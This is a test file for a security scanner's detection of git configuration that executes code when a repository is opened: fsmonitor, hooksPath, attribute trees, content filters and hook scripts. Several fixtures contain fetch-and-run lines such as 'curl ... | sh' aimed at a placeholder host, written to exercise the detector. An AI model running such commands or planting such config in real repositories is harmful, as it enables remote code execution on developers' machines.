/**
 * Ship Safe — WorkspaceTrustAgent git configuration fixtures
 * ===========================================================
 *
 * Coverage for repository-supplied git configuration that executes when a
 * coding agent opens the folder (issue #203, GitSpawn / CVE-2026-71963).
 *
 * FIXTURE SAFETY
 * --------------
 * Every fixture here is built into a temp directory at run time and torn down
 * afterwards. None of it is committed. A checked-in `.git/config` carrying
 * `core.fsmonitor = <command>` would be a working attack against this
 * repository's own contributors and CI: any git invocation with that directory
 * as the cwd would execute it, and `npm test` runs plenty. The fixture
 * directory is therefore named `dot-git` on disk when a test needs one on disk,
 * and materialised as `.git` only inside the temp tree.
 *
 * Run: node --test cli/__tests__/workspace-trust-git.test.js
 */

import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'fs';
import path from 'path';
import os from 'os';

import { WorkspaceTrustAgent } from '../agents/workspace-trust-agent.js';

function tmp() { return fs.mkdtempSync(path.join(os.tmpdir(), 'shipsafe-wstrust-')); }
function cleanup(dir) { try { fs.rmSync(dir, { recursive: true, force: true }); } catch { /* */ } }

/** Build a temp repo with the given .git/config contents. */
function repoWithConfig(dir, config) {
  const gitDir = path.join(dir, '.git');
  fs.mkdirSync(gitDir, { recursive: true });
  fs.writeFileSync(path.join(gitDir, 'config'), config);
  return gitDir;
}

async function scan(dir) {
  return new WorkspaceTrustAgent().analyze({ rootPath: dir, files: [], recon: {}, options: {} });
}

const rulesOf = (findings) => findings.map((f) => f.rule);

// =============================================================================
// core.fsmonitor — the GitSpawn primary sink
// =============================================================================

describe('WorkspaceTrustAgent — core.fsmonitor', () => {
  it('flags fsmonitor set to a command', async () => {
    const dir = tmp();
    try {
      repoWithConfig(dir, [
        '[core]',
        '\trepositoryformatversion = 0',
        '\tfsmonitor = "curl -s https://example.invalid/p | sh"',
        '',
      ].join('\n'));

      const f = await scan(dir);
      const hit = f.find((x) => x.rule === 'WORKSPACE_GIT_FSMONITOR_EXEC');

      assert.ok(hit, 'expected WORKSPACE_GIT_FSMONITOR_EXEC');
      assert.equal(hit.severity, 'critical');
      assert.equal(hit.confidence, 'high');
      assert.equal(hit.line, 3, 'finding points at the offending line');
      assert.match(hit.matched, /curl/);
    } finally { cleanup(dir); }
  });

  it('does not flag fsmonitor = true, which selects git\'s built-in daemon', async () => {
    const dir = tmp();
    try {
      repoWithConfig(dir, '[core]\n\tfsmonitor = true\n');
      const f = await scan(dir);
      assert.ok(!rulesOf(f).includes('WORKSPACE_GIT_FSMONITOR_EXEC'));
    } finally { cleanup(dir); }
  });

  it('does not flag any of git\'s boolean spellings', async () => {
    for (const value of ['true', 'false', 'yes', 'no', 'on', 'off', '1', '0', 'TRUE']) {
      const dir = tmp();
      try {
        repoWithConfig(dir, `[core]\n\tfsmonitor = ${value}\n`);
        const f = await scan(dir);
        assert.ok(
          !rulesOf(f).includes('WORKSPACE_GIT_FSMONITOR_EXEC'),
          `fsmonitor = ${value} must not be reported`
        );
      } finally { cleanup(dir); }
    }
  });

  it('does not flag a bare fsmonitor key, which git reads as true', async () => {
    const dir = tmp();
    try {
      repoWithConfig(dir, '[core]\n\tfsmonitor\n');
      const f = await scan(dir);
      assert.ok(!rulesOf(f).includes('WORKSPACE_GIT_FSMONITOR_EXEC'));
    } finally { cleanup(dir); }
  });

  it('ignores a trailing comment when reading the command', async () => {
    const dir = tmp();
    try {
      repoWithConfig(dir, '[core]\n\tfsmonitor = ./watch.sh # speeds up status\n');
      const f = await scan(dir);
      const hit = f.find((x) => x.rule === 'WORKSPACE_GIT_FSMONITOR_EXEC');
      assert.ok(hit);
      assert.equal(hit.matched, './watch.sh');
    } finally { cleanup(dir); }
  });

  it('reports both occurrences when a safe value is overridden by a command', async () => {
    const dir = tmp();
    try {
      repoWithConfig(dir, '[core]\n\tfsmonitor = true\n\tfsmonitor = ./payload.sh\n');
      const f = await scan(dir).then((r) => r.filter((x) => x.rule === 'WORKSPACE_GIT_FSMONITOR_EXEC'));
      assert.equal(f.length, 1, 'only the command value is a sink');
      assert.equal(f[0].line, 3);
    } finally { cleanup(dir); }
  });

  it('reads .git/config through a gitdir pointer file', async () => {
    const dir = tmp();
    try {
      const real = path.join(dir, 'real-git-dir');
      fs.mkdirSync(real, { recursive: true });
      fs.writeFileSync(path.join(real, 'config'), '[core]\n\tfsmonitor = ./payload.sh\n');
      fs.writeFileSync(path.join(dir, '.git'), 'gitdir: ./real-git-dir\n');

      const f = await scan(dir);
      assert.ok(rulesOf(f).includes('WORKSPACE_GIT_FSMONITOR_EXEC'));
    } finally { cleanup(dir); }
  });

  it('strips control characters from the reported value', async () => {
    const dir = tmp();
    try {
      repoWithConfig(dir, `[core]\n\tfsmonitor = ./p\u001b[2Jayload.sh\n`);
      const f = await scan(dir);
      const hit = f.find((x) => x.rule === 'WORKSPACE_GIT_FSMONITOR_EXEC');
      assert.ok(hit);
      // eslint-disable-next-line no-control-regex
      assert.ok(!/[\u0000-\u001f\u007f]/.test(hit.matched), 'no raw escape sequences reach output');
    } finally { cleanup(dir); }
  });
});

// =============================================================================
// core.hooksPath
// =============================================================================

describe('WorkspaceTrustAgent — core.hooksPath', () => {
  it('flags hooks redirected into the repository', async () => {
    const dir = tmp();
    try {
      repoWithConfig(dir, '[core]\n\thooksPath = .githooks\n');
      fs.mkdirSync(path.join(dir, '.githooks'), { recursive: true });

      const f = await scan(dir);
      const hit = f.find((x) => x.rule === 'WORKSPACE_GIT_HOOKS_PATH');
      assert.ok(hit, 'expected WORKSPACE_GIT_HOOKS_PATH');
      assert.equal(hit.severity, 'critical');
    } finally { cleanup(dir); }
  });

  it('does not flag a hooksPath outside the scanned tree', async () => {
    const dir = tmp();
    try {
      repoWithConfig(dir, '[core]\n\thooksPath = /usr/local/share/githooks\n');
      const f = await scan(dir);
      assert.ok(!rulesOf(f).includes('WORKSPACE_GIT_HOOKS_PATH'));
    } finally { cleanup(dir); }
  });

  it('does not flag husky, which redirects hooksPath by design', async () => {
    const dir = tmp();
    try {
      repoWithConfig(dir, '[core]\n\thooksPath = .husky/_\n');
      fs.mkdirSync(path.join(dir, '.husky', '_'), { recursive: true });
      fs.writeFileSync(path.join(dir, '.husky', '_', 'husky.sh'), '#!/bin/sh\n');

      const f = await scan(dir);
      assert.ok(!rulesOf(f).includes('WORKSPACE_GIT_HOOKS_PATH'));
    } finally { cleanup(dir); }
  });

  it('does not flag lefthook when its config is present', async () => {
    const dir = tmp();
    try {
      repoWithConfig(dir, '[core]\n\thooksPath = .lefthook\n');
      fs.mkdirSync(path.join(dir, '.lefthook'), { recursive: true });
      fs.writeFileSync(path.join(dir, 'lefthook.yml'), 'pre-commit:\n  commands:\n    lint:\n      run: npm run lint\n');

      const f = await scan(dir);
      assert.ok(!rulesOf(f).includes('WORKSPACE_GIT_HOOKS_PATH'));
    } finally { cleanup(dir); }
  });

  it('still flags a .husky path when husky is not actually installed', async () => {
    const dir = tmp();
    try {
      // Directory name alone must not buy an exemption, or the suppression
      // becomes the bypass.
      repoWithConfig(dir, '[core]\n\thooksPath = .husky\n');
      fs.mkdirSync(path.join(dir, '.husky'), { recursive: true });

      const f = await scan(dir);
      assert.ok(rulesOf(f).includes('WORKSPACE_GIT_HOOKS_PATH'));
    } finally { cleanup(dir); }
  });
});

// =============================================================================
// attr.tree
// =============================================================================

describe('WorkspaceTrustAgent — attr.tree', () => {
  it('flags attributes sourced from a repository-controlled tree', async () => {
    const dir = tmp();
    try {
      repoWithConfig(dir, '[attr]\n\ttree = HEAD:.gitattributes\n');
      const f = await scan(dir);
      const hit = f.find((x) => x.rule === 'WORKSPACE_GIT_ATTR_TREE');
      assert.ok(hit);
      assert.equal(hit.severity, 'high');
    } finally { cleanup(dir); }
  });

  it('reports nothing for a config with no attr section', async () => {
    const dir = tmp();
    try {
      repoWithConfig(dir, '[core]\n\trepositoryformatversion = 0\n');
      const f = await scan(dir);
      assert.equal(f.length, 0);
    } finally { cleanup(dir); }
  });
});

// =============================================================================
// filter.*.process / clean / smudge
// =============================================================================

describe('WorkspaceTrustAgent — content filters', () => {
  it('flags a filter process command', async () => {
    const dir = tmp();
    try {
      repoWithConfig(dir, '[filter "build"]\n\tprocess = node ./tools/filter.js\n');
      const f = await scan(dir);
      const hit = f.find((x) => x.rule === 'WORKSPACE_GIT_FILTER_PROCESS');
      assert.ok(hit);
      assert.equal(hit.severity, 'high');
      assert.match(hit.description, /filter\.build\.process/);
    } finally { cleanup(dir); }
  });

  it('flags clean and smudge commands', async () => {
    const dir = tmp();
    try {
      repoWithConfig(dir, '[filter "x"]\n\tclean = ./clean.sh\n\tsmudge = ./smudge.sh\n');
      const f = await scan(dir).then((r) => r.filter((x) => x.rule === 'WORKSPACE_GIT_FILTER_PROCESS'));
      assert.equal(f.length, 2);
    } finally { cleanup(dir); }
  });

  it('does not flag Git LFS', async () => {
    const dir = tmp();
    try {
      repoWithConfig(dir, [
        '[filter "lfs"]',
        '\tclean = git-lfs clean -- %f',
        '\tsmudge = git-lfs smudge -- %f',
        '\tprocess = git-lfs filter-process',
        '\trequired = true',
        '',
      ].join('\n'));

      const f = await scan(dir);
      assert.ok(!rulesOf(f).includes('WORKSPACE_GIT_FILTER_PROCESS'));
    } finally { cleanup(dir); }
  });

  it('does not let a hostile command hide behind the lfs filter name', async () => {
    const dir = tmp();
    try {
      // The exemption is by command, not by filter name.
      repoWithConfig(dir, '[filter "lfs"]\n\tprocess = ./payload.sh\n');
      const f = await scan(dir);
      assert.ok(rulesOf(f).includes('WORKSPACE_GIT_FILTER_PROCESS'));
    } finally { cleanup(dir); }
  });
});

// =============================================================================
// .git/hooks
// =============================================================================

describe('WorkspaceTrustAgent — hook scripts', () => {
  it('flags an executable hook that is not a sample', async () => {
    const dir = tmp();
    try {
      const gitDir = repoWithConfig(dir, '[core]\n\trepositoryformatversion = 0\n');
      const hooks = path.join(gitDir, 'hooks');
      fs.mkdirSync(hooks, { recursive: true });
      fs.writeFileSync(path.join(hooks, 'post-checkout'), '#!/bin/sh\ncurl example.invalid | sh\n', { mode: 0o755 });

      const f = await scan(dir);
      const hit = f.find((x) => x.rule === 'WORKSPACE_GIT_HOOK_PRESENT');
      assert.ok(hit, 'expected WORKSPACE_GIT_HOOK_PRESENT');
      assert.equal(hit.matched, 'post-checkout');
    } finally { cleanup(dir); }
  });

  it('does not flag git\'s shipped .sample hooks', async () => {
    const dir = tmp();
    try {
      const gitDir = repoWithConfig(dir, '[core]\n\trepositoryformatversion = 0\n');
      const hooks = path.join(gitDir, 'hooks');
      fs.mkdirSync(hooks, { recursive: true });
      for (const name of ['pre-commit.sample', 'post-checkout.sample', 'pre-push.sample']) {
        fs.writeFileSync(path.join(hooks, name), '#!/bin/sh\nexit 0\n', { mode: 0o755 });
      }

      const f = await scan(dir);
      assert.ok(!rulesOf(f).includes('WORKSPACE_GIT_HOOK_PRESENT'));
    } finally { cleanup(dir); }
  });

  it('does not flag a non-executable file in the hooks directory', async () => {
    const dir = tmp();
    try {
      const gitDir = repoWithConfig(dir, '[core]\n\trepositoryformatversion = 0\n');
      const hooks = path.join(gitDir, 'hooks');
      fs.mkdirSync(hooks, { recursive: true });
      fs.writeFileSync(path.join(hooks, 'README'), 'notes\n', { mode: 0o644 });

      const f = await scan(dir);
      assert.ok(!rulesOf(f).includes('WORKSPACE_GIT_HOOK_PRESENT'));
    } finally { cleanup(dir); }
  });

  it('does not read a hooks directory outside the scanned tree', async () => {
    const dir = tmp();
    const outside = tmp();
    try {
      // A hooksPath pointing out of the repository is the user's own machine
      // configuration. Reporting the scripts there would blame the repository
      // for files it never shipped.
      fs.writeFileSync(path.join(outside, 'post-checkout'), '#!/bin/sh\necho mine\n', { mode: 0o755 });
      repoWithConfig(dir, `[core]\n\thooksPath = ${outside}\n`);

      const f = await scan(dir);
      assert.ok(!rulesOf(f).includes('WORKSPACE_GIT_HOOK_PRESENT'));
      assert.ok(!rulesOf(f).includes('WORKSPACE_GIT_HOOKS_PATH'));
    } finally { cleanup(dir); cleanup(outside); }
  });

  it('does not fall back to .git/hooks once hooksPath is set elsewhere', async () => {
    const dir = tmp();
    const outside = tmp();
    try {
      // Git stops consulting .git/hooks when hooksPath is set, so a leftover
      // script there will never run and must not be reported as if it would.
      const gitDir = repoWithConfig(dir, `[core]\n\thooksPath = ${outside}\n`);
      const hooks = path.join(gitDir, 'hooks');
      fs.mkdirSync(hooks, { recursive: true });
      fs.writeFileSync(path.join(hooks, 'pre-commit'), '#!/bin/sh\nexit 0\n', { mode: 0o755 });

      const f = await scan(dir);
      assert.ok(!rulesOf(f).includes('WORKSPACE_GIT_HOOK_PRESENT'));
    } finally { cleanup(dir); cleanup(outside); }
  });

  it('reads the redirected directory, including for an installed hook manager', async () => {
    const dir = tmp();
    try {
      // husky is exempt from the hooksPath finding, but a planted script inside
      // its directory still executes and must still be reported.
      repoWithConfig(dir, '[core]\n\thooksPath = .husky/_\n');
      const huskyDir = path.join(dir, '.husky', '_');
      fs.mkdirSync(huskyDir, { recursive: true });
      fs.writeFileSync(path.join(huskyDir, 'husky.sh'), '#!/bin/sh\n');
      fs.writeFileSync(path.join(huskyDir, 'post-checkout'), '#!/bin/sh\ncurl example.invalid | sh\n', { mode: 0o755 });

      const f = await scan(dir);
      assert.ok(!rulesOf(f).includes('WORKSPACE_GIT_HOOKS_PATH'), 'husky redirect stays suppressed');
      assert.ok(rulesOf(f).includes('WORKSPACE_GIT_HOOK_PRESENT'), 'its contents are still read');
    } finally { cleanup(dir); }
  });
});

// =============================================================================
// SAFE BASELINE
// =============================================================================

describe('WorkspaceTrustAgent — safe repositories', () => {
  it('reports nothing for an ordinary repository', async () => {
    const dir = tmp();
    try {
      const gitDir = repoWithConfig(dir, [
        '[core]',
        '\trepositoryformatversion = 0',
        '\tfilemode = true',
        '\tbare = false',
        '\tlogallrefupdates = true',
        '[remote "origin"]',
        '\turl = https://github.com/example/example.git',
        '\tfetch = +refs/heads/*:refs/remotes/origin/*',
        '[branch "main"]',
        '\tremote = origin',
        '\tmerge = refs/heads/main',
        '',
      ].join('\n'));

      const hooks = path.join(gitDir, 'hooks');
      fs.mkdirSync(hooks, { recursive: true });
      fs.writeFileSync(path.join(hooks, 'pre-commit.sample'), '#!/bin/sh\nexit 0\n', { mode: 0o755 });

      const f = await scan(dir);
      assert.deepEqual(f, [], 'a healthy repository produces no findings');
    } finally { cleanup(dir); }
  });

  it('reports nothing when there is no git directory at all', async () => {
    const dir = tmp();
    try {
      fs.writeFileSync(path.join(dir, 'index.js'), 'export default 1;\n');
      const f = await scan(dir);
      assert.deepEqual(f, []);
    } finally { cleanup(dir); }
  });
});
